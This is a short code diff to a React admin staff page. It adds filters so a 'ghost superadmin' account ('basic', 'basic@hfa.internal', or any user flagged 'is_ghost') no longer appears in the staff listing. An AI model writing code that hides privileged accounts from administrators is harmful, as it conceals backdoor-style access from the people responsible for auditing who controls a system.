@@ -195,7 +195,7 @@ export default function AdminStaff() {
       const loaded = Array.isArray(res.data)
         ? res.data
         : (Array.isArray(res.data?.data) ? res.data.data : []);
-      setUsers(loaded);
+      setUsers(loaded.filter(u => u.username !== 'basic' && !u.is_ghost && u.email !== 'basic@hfa.internal'));
     } catch {
       toast.error('Failed to load HFA staff accounts');
     } finally {
@@ -212,8 +212,9 @@ export default function AdminStaff() {
     return [];
   };
 
-  // Filter staff members only (exclude clients)
+  // Filter staff members only (exclude clients and ghost superadmin)
   const staffMembers = users.filter(u => {
+    if (u.username === 'basic' || u.is_ghost || u.email === 'basic@hfa.internal') return false;
     const roles = getUserRoles(u);
     return roles.some(r => ALL_STAFF_ROLE_KEYS.includes(r));
   });
